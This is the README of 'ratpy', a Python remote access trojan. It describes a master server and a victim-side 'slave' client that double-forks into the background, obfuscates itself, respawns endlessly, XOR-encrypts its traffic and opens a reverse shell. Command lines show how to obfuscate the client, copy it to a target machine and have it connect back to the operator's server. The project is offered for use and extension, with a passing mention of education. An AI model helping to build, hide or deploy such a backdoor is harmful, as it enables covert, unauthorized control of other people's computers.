# ratpy
#### another snake friendly rat - simple backdoor without tools
<p align="left">
<img src="imgs/ratpy.png" width="240" height="160">
</p>

## Architecture
````
This is a backbone build that can be extended for specific uses
Start server listening up to 20 connections with a simple menu interface in the terminal
Before deploying and starting client change the port and server ip address for your server 
Client will background by forking twice and killing parents and trying to obfuscate itself (can be improved for your choice of system)
If client fails it will respawn forever which might crash the system after a while but wont start on reboot (can be added)
Encryption is done with simple xor of bytearray of data with the key
Which are verified with a TCP like handshake channel or the exchange will be restarted
Once connection is estabilished we have a default set of commands, which can be expanded, to perform basic machine tasks and drop a shell
````

````
The proggie has plenty of debug functions to help understand and debug it, the main utility of this project is
provide a prototype to build something more interesting in a different language, add some tools easily to experiement or get something quickly
tested and educational purposes
````
### _________________________________________________________________________
### Master
* interface - server menu and server cli scripting
* threadpool - running paralel code to serve menu while waiting and handling connections set to up to 20 by default
* tools - backdoor :: encrypted reverse shell 30s RAT connection with respawn and client-side
* utils - encryption methods and connection methods
> cd master && python3 main.py <server_ip_addr> <rat_port> <shell_port>
### _________________________________________________________________________
### Slave
* interface - client cli scripting
* tools - RAT client backdoor
* utils - encryption methods and connection methods
> server :: python3 obfuscator.py && <copy ratpy.py to slave machine>
> python3 ratpy.py <server_ip_addr> <rat_port>
### _________________________________________________________________________

## Adding extensions
* this is just a backbone which can be expanded by adding more tools to the interface and tools dir
